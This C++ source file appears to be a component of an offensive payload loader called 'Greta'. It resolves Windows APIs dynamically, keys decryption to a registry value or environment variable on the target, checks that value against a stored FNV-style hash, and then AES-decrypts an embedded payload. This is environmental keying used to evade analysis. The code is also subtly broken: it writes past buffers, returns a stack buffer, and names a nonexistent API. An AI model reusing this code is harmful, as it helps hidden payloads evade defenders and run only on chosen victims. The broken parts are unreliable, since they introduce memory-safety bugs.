#include "greta.h"
#include <windows.h>
#include <stdio.h>
#include <vector>
#include <string>

typedef DWORD(WINAPI* _FormatMessageA)(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list* Arguments);
typedef LSTATUS(WINAPI* _RegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
typedef LSTATUS(WINAPI* _RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
typedef LSTATUS(WINAPI* _RegCloseKey)(HKEY hKey);
typedef DWORD(WINAPI* _GetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
typedef BOOL(WINAPI* _CryptAcquireContextA)(HCRYPTPROV* phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags);
typedef BOOL(WINAPI* _CryptCreateHash)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH* phHash);
typedef BOOL(WINAPI* _CryptHashData)(HCRYPTHASH hHash, const BYTE* pbData, DWORD dwDataLen, DWORD dwFlags);
typedef BOOL(WINAPI* _CryptDeriveKey)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY* phKey);
typedef BOOL(WINAPI* _CryptDecrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen);
typedef BOOL(WINAPI* _CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
typedef BOOL(WINAPI* _CryptDestroyHash)(HCRYPTHASH hHash);
typedef BOOL(WINAPI* _CryptDestroyKey)(HCRYPTKEY hKey);

#define ADVAPI32 "advapi32"
#define KERNEL32 "kernel32"

FARPROC resolve_function_address(LPCSTR lpModuleName, LPCSTR lpProcName)
{
	HMODULE hModule = nullptr;
	FARPROC pFunction = nullptr;

	hModule = GetModuleHandleA(lpModuleName);

	if (hModule == nullptr)
	{
		return (FARPROC)nullptr;
	}
	pFunction = GetProcAddress(hModule, lpProcName);

	if (hModule == nullptr)
	{
		return (FARPROC)nullptr;
	}

	return pFunction;
}

void zzSleep(int s)
{
	typedef void(WINAPI* _Sleep)(DWORD dwMilliSeconds);

	_Sleep pSleep = reinterpret_cast<_Sleep>(resolve_function_address(KERNEL32, "Sleep"));
	pSleep(s);
	return;
}

char* win_error_msg()
{
	_FormatMessageA pFormatMessageA = reinterpret_cast<_FormatMessageA>(resolve_function_address(KERNEL32, "FormatMessageBoxA"));
	char error[MAX_PATH];
	pFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error, 255, NULL);
	return error;
}

int fowler_noll_vo(std::string s)
{
	if (s.size() == 0)
	{
		return 0;
	}

	int hva = 38395996;
	int prime = 61037065;

	for (int i = 0; i < s.size(); i++)
	{
		hva = hva ^ (s.data()[i]);
		hva = hva * prime;
	}
	return hva;
}

BOOL compare_fnv(int a, int b)
{
	if (a == b)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

std::string get_registry_value(int hive, std::string subkey, std::string valuename)
{
	HKEY hKey = nullptr;
	LSTATUS lStatus = ERROR;
	DWORD lpType = REG_SZ;
	LPBYTE lpData[512];
	DWORD lpcbData = sizeof(lpData);

	HKEY hHive = NULL;

	switch (hive)
	{
	case HKLM:
		hHive = HKEY_LOCAL_MACHINE;
		break;
	case HKCU:
		hHive = HKEY_CURRENT_USER;
	default:
		break;
	}

	if (hHive == 0)
	{
		return{};
	}

	_RegOpenKeyExA pRegOpenKeyExA = reinterpret_cast<_RegOpenKeyExA>(resolve_function_address(ADVAPI32, "RegOpenKeyExA"));
	// Sleep: zzSleep(SLEEP);
	_RegQueryValueExA pRegQueryValueExA = reinterpret_cast<_RegQueryValueExA>(resolve_function_address(ADVAPI32, "RegQueryValueExA"));
	// Sleep: zzSleep(SLEEP);
	_RegCloseKey pRegCloseKey = reinterpret_cast<_RegCloseKey>(resolve_function_address(ADVAPI32, "RegCloseKey"));

	lStatus = pRegOpenKeyExA(hHive, subkey.c_str(), 0, KEY_READ, &hKey);

	if (lStatus != 0)
	{
		return{};
	}
	// Sleep: zzSleep(SLEEP);

	lStatus = pRegQueryValueExA(hKey, valuename.c_str(), 0, &lpType, (LPBYTE)lpData, &lpcbData);

	if (lStatus != 0)
	{
		return{};
	}

	// Sleep: zzSleep(SLEEP);
	lStatus = pRegCloseKey(hKey);
	if (lStatus != 0)
	{
		return{};
	}

	std::string key((char*)lpData);
	// Debug: printf("  // Registry Key: %s!%s == %s\n\n", subkey.c_str(), valuename.c_str(), key.c_str());
	return key;
}

std::string get_environmental_variable(std::string envvar)
{
	_GetEnvironmentVariableA pGetEnvironmentVariableA = reinterpret_cast<_GetEnvironmentVariableA>(resolve_function_address(KERNEL32, "GetEnvironmentVariableA"));
	// Sleep: zzSleep(SLEEP);
	const DWORD buffSize = 1024;
	char key[buffSize];
	if (pGetEnvironmentVariableA(envvar.c_str(), key, buffSize))
	{
		// Debug: printf("  // Environmental Variable: %s == %s\n\n", envvar.c_str(), key);
		return std::string(key);
	}
	else
	{
		return{};
	}
}

std::vector<unsigned char> aes256cbc_decrypt(std::vector<unsigned char> enc, std::string key)
{
	_CryptAcquireContextA pCryptAcquireContextA = reinterpret_cast<_CryptAcquireContextA>(resolve_function_address(ADVAPI32, "CryptAcquireContextA"));
	// Sleep: zzSleep(SLEEP);

	_CryptCreateHash pCryptCreateHash = reinterpret_cast<_CryptCreateHash>(resolve_function_address(ADVAPI32, "CryptCreateHash"));
	// Sleep: zzSleep(SLEEP);

	_CryptHashData pCryptHashData = reinterpret_cast<_CryptHashData>(resolve_function_address(ADVAPI32, "CryptHashData"));
	// Sleep: zzSleep(SLEEP);

	_CryptDeriveKey pCryptDeriveKey = reinterpret_cast<_CryptDeriveKey>(resolve_function_address(ADVAPI32, "CryptDeriveKey"));
	// Sleep: zzSleep(SLEEP);

	_CryptDecrypt pCryptDecrypt = reinterpret_cast<_CryptDecrypt>(resolve_function_address(ADVAPI32, "CryptDecrypt"));
	// Sleep: zzSleep(SLEEP);

	_CryptReleaseContext pCryptReleaseContext = reinterpret_cast<_CryptReleaseContext>(resolve_function_address(ADVAPI32, "CryptReleaseContext"));
	// Sleep: zzSleep(SLEEP);

	_CryptDestroyHash pCryptDestroyHash = reinterpret_cast<_CryptDestroyHash>(resolve_function_address(ADVAPI32, "CryptDestroyHash"));
	// Sleep: zzSleep(SLEEP);

	_CryptDestroyKey pCryptDestroyKey = reinterpret_cast<_CryptDestroyKey>(resolve_function_address(ADVAPI32, "CryptDestroyKey"));
	// Sleep: zzSleep(SLEEP);

	DWORD pdwDataLen = enc.size();

	std::vector<unsigned char> decrypted;

	if (key.empty())
	{
		return decrypted;
	}

	HCRYPTPROV hProv = NULL;
	HCRYPTHASH hHash = NULL;
	HCRYPTKEY hKey = NULL;

	// This is 100% wrong :D

	char* keyBuffer = new char[key.size()];
	memcpy(keyBuffer, key.data(), key.size());
	keyBuffer[key.size()] = '\00';

	// This is 100% wrong :D
	char* encBuffer = new char[enc.size()];
	memcpy(encBuffer, enc.data(), enc.size());
	encBuffer[enc.size()] = '\00';

	if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) == FALSE)
	{
		return {};
	}
	// Sleep: zzSleep(SLEEP);

	if (pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash) == FALSE)
	{
		return{};
	}
	// Sleep: zzSleep(SLEEP);

	if (pCryptHashData(hHash, (BYTE*)keyBuffer, (DWORD)key.size(), 0) == FALSE)
	{
		return{};
	}
	// Sleep: zzSleep(SLEEP);

	if (pCryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey) == FALSE)
	{
		return{};
	}
	// Sleep: zzSleep(SLEEP);

	if (pCryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)encBuffer, (DWORD*)&pdwDataLen) == FALSE)
	{
		return{};
	}
	// Sleep: zzSleep(SLEEP);

	pCryptReleaseContext(hProv, 0);
	pCryptDestroyHash(hHash);
	pCryptDestroyKey(hKey);

	std::vector <unsigned char> vec(encBuffer, encBuffer + enc.size());
	return vec;
}

void print_data(char* label, std::vector<unsigned char> data)
{
	// Debug: printf("> %s\n", label);
	// Debug: printf("  :: Data: ");
	// Debug: for (int i = 0; i < data.size(); i++)
	// Debug: {
	// Debug: 	printf("0x%X ", data.data()[i]);
	// Debug: }
	// Debug: printf("\n");
	// Debug: printf("  :: Size: %d\n", (int)data.size());
	return;
}

GRETA do_keying(PGRETA greta)
{
	GRETA newGreta{};
	newGreta.bStatus = FALSE;

	std::string subkey = greta->subkey;
	std::string valuename = greta->valuename;
	std::string envvar = greta->envvar;

	std::vector<unsigned char> enc = greta->payload;

	int keySz = greta->keySz;

	int type = greta->type;
	int hive = greta->hive;

	int fnv = greta->fnv;

	std::string key;

	if (enc.empty())
	{
		newGreta.errormsg = "Encrypted length is 0\n";
		newGreta.bStatus = FALSE;
		return newGreta;
	}

	switch (type)
	{
	case REGISTRY:
		key = get_registry_value(hive, subkey, valuename);
		break;
	case VARIABLE:
		key = get_environmental_variable(envvar);
		break;
	default:
		break;
	}
	// Sleep: zzSleep(SLEEP);

	if (key.empty())
	{
		newGreta.errormsg = "Key length is NULL\n";
		newGreta.bStatus = FALSE;
		return newGreta;
	}

	//print_data((char*)"Key", key);
	//printf("\n");

	BOOL bCompare = compare_fnv((int)fnv, fowler_noll_vo(key));
	// Sleep: zzSleep(SLEEP);

	printf(" Keying..."); // Result
	if (bCompare == TRUE)
	{
		printf("\x1B[32m\t\tOK\033[0m\n"); // Result
		// Debug: printf("> Hash values match!\n\n");
	}
	else
	{
		printf("\x1B[31m\t\tFAILED\033[0m\n"); // Result
		newGreta.errormsg = "Environmental data FNV mismatch\n";
		newGreta.bStatus = FALSE;
		return newGreta;
	}

	// Debug: print_data((char*)"Encrypted", enc);
	// Debug: printf("  :: Encrypted data:\n%s\n", enc.data());
	// Debug: printf("\n");

	std::vector<unsigned char> decrypted = aes256cbc_decrypt(enc, key);

	if (decrypted.empty())
	{
		char buffer[1024];
		sprintf_s(buffer, sizeof buffer, "AES256CBC decryption failed, Windows Error: %s\n", win_error_msg());
		newGreta.errormsg = buffer;
		newGreta.bStatus = FALSE;
		return newGreta;
	}
	// Sleep: zzSleep(SLEEP);

	// Debug: print_data((char*)"Decrypted", enc);

	// Debug: printf("  :: Decrypted data:\n%s\n", decrypted.data());
	// Debug: printf("\n");

	newGreta.bStatus = TRUE;
	newGreta.payload = decrypted;
	newGreta.errormsg = "Greta finished successfully";
	return newGreta;
}
